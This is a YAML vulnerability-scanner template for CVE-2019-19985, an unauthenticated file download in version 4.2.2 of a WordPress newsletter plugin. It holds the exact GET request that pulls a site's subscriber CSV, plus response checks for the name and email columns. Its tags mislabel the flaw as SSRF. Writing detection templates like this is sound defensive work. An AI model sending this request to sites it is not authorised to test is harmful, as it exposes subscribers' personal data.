id: CVE-2019-19985

info:
  name: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
  author: bufsnake
  severity: medium
  verified: false
  description: |
    WordPress Plugin Email Subscribers & Newsletters 4.2.2 allows unauthenticated users to download the user list CSV file.
  tags: cve,cve2019,wordpress,plugin,ssrf
  created: 2023/08/10

rules:
  r0:
    request:
      method: GET
      path: /wp-admin/admin.php?page=download_report&report=users&status=all
    expression: |
      response.status == 200 && 
      "(?i)filename=.*?.csv".bmatches(bytes(response.headers["content-disposition"])) &&
      response.body.bcontains(b"Name") &&
      response.body.bcontains(b"Email") &&
      response.body.bcontains(b"Status") &&
      response.body.bcontains(b"Created On")
expression: r0()
